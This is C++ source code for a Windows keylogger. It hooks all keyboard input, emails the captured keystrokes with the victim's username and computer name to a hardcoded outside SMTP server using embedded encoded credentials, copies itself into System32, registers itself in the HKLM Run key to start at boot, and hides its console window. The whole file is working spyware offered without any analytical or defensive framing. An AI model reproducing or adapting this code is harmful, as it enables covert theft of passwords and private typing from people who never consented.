#include "ftpkeylogger.h"

unsigned int __stdcall sendmail(void *vpkeylog){

    string keylog = *(string *)vpkeylog;
    cout << keylog.c_str();

    char username[4096]{};
    DWORD dummy = 4096; //Never used
    GetUserName(username, &dummy);

    string formatted_subject;
    formatted_subject.append(username); formatted_subject.append("@"); formatted_subject.append(computername); formatted_subject.append("--");
    formatted_subject.append(gettime());

    //cout << keylog.c_str();

    email sendlog("54.245.65.132", 587, "dHN0ZXIxQGxpdmUuY29t", "YkhmdVFXOEV4RU5KMkJRREVwOVluZw==",
                                          "OGM_KEYLOGGER_SERVICE_DAEMON@OGM.com", filetokens[2].c_str(), formatted_subject.c_str() ,keylog.c_str());
    sendlog.sendmail();
    delete (string *)vpkeylog;
    //cout << "Email sent";
    return 0;
}



unsigned int __stdcall keylogthreadhook(void *){

    HINSTANCE hinst = GetModuleHandle(NULL);
    HHOOK hhkLowLevelKybd  = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);

    MSG msg;

    //MessageBox(NULL, "entered", NULL, NULL);

        while(GetMessage(&msg, NULL, 0, 0)){
            TranslateMessage(&msg);
            DispatchMessage(&msg);

        }

      UnhookWindowsHookEx(hhkLowLevelKybd);

      return 0;
}



LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){

    PKBDLLHOOKSTRUCT structdll = (PKBDLLHOOKSTRUCT) lParam;

    switch(nCode){

        case HC_ACTION:
            switch(wParam){

                case WM_KEYDOWN:{


                    //How should i change the following lines?

                    char buffer[256]{};
                    GetKeyNameText((MapVirtualKey(structdll->vkCode, 0)<<16), buffer, 50);
                    //use this?: ToAscii(structdll->vkCode, structdll->scanCode, NULL, myword, 0);
                    tempkeylog_buffer.append(buffer);
                }
                break;
            }
        break;
    }

return CallNextHookEx(NULL, nCode, wParam,lParam);

}

string gettime(){

        time_t rawtime;
        time ( &rawtime );
        string str = ctime(&rawtime);

        //Eliminate ':' characters

        string::iterator it;

        for ( it = str.begin() ; it < str.end(); it++ ){

            if (*it == ':'){

                *it = ',';

            }
        }
        //cut off \n at the end of string (why the fuck do they even do that?)
        str = str.substr(0, str.size()-1);

    return str;
}


void AddtoStartup(){
 /*FIRST THING WE DO IS COPY SERVER.EXE TO SYSTEM32 FOLDER AND THEN MAKE A REGISTRY KEY THAT OPENS SERVER.EXE AT STARTUP*/
    //NOTE we still have to implement the process hiding in task manager!~
    std::string filename ="\\";
    char system[MAX_PATH];
    extern char pathtofile[MAX_PATH];
    extern const string RegistryKeyName;

    //GET MODULE HANDLE OF CALLING PROGRAM I.E SERVER.EXE'S HANDLE
    HMODULE GetModH = GetModuleHandle(NULL);

    //GET PATH OF SERVER.EXE
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));

    filename.append(PathFindFileNameA(pathtofile));

    //GET SYSTEM DIRECTORY LIKE SYSTEM32 OR SYSWOW64, FOR COMPATIBILITY REASONS
    GetSystemDirectory(system,sizeof(system));

    //APPEND MY FILENAME AFTER THE SYSTEMDIRECTORY SO WE CAN DROP OUR SERVER INTO THE SYSTEM 32 FOLDER
    strcat(system, filename.c_str());

    //COPY SERVER TO THE SYSTEM32 FOLDER
    CopyFile(pathtofile,system,false);

    //MAKE A REGISTRY KEY TO THE SYSTEM32FOLDER WITH SERVER.EXE TO RUN AT STARTUP
    HKEY hKey;

    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );

    //Some bs name in parameter 2 of Regset valueex.
    RegSetValueEx(hKey, RegistryKeyName.c_str(),0,REG_SZ,(const unsigned char*)system,sizeof(system));

    RegCloseKey(hKey);
}

void RemoveFromStartup(){

    extern char pathtofile[MAX_PATH];
    extern const string RegistryKeyName;

    HKEY hKey;

    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );

    RegDeleteValue(hKey, RegistryKeyName.c_str());

    RegCloseKey(hKey);

    MoveFileEx(pathtofile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);


}

void Stealth(){

  HWND Stealth;
  AllocConsole();

  Stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Stealth,0);

}
